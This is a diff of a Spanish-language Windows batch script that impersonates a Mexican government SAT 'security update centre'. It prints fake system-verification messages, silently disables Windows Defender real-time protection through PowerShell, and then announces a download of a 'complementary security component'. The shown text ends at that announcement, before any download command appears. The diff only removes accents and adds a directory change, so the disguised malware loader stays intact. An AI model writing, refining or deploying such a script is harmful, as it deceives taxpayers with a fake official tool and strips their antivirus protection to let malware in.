@@ -1,20 +1,23 @@
 @echo off
 color 1F
-title Centro de Actualización de Seguridad de Windows
+title Centro de Actualizacion de Seguridad
+
+:: Asegura que todo se ejecute desde el mismo directorio del .bat
+cd /d %~dp0
 
 echo.
 echo ============================================================
-echo         GOBIERNO DE MÉXICO - CENTRO DE SEGURIDAD SAT
+echo         GOBIERNO DE MEXICO - CENTRO DE SEGURIDAD SAT
 echo ============================================================
 echo.
-echo [*] Iniciando verificación de integridad del sistema...
+echo [*] Iniciando verificacion de integridad del sistema...
 timeout /t 2 >nul
 
-echo [*] Aplicando configuración avanzada de seguridad...
+echo [*] Aplicando configuracion avanzada de seguridad...
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 timeout /t 2 >nul
 
-echo [*] Verificando conexión segura con el servidor tributario...
+echo [*] Verificando conexion segura con el servidor tributario...
 timeout /t 2 >nul
 
 echo [*] Descargando componente de seguridad complementario...
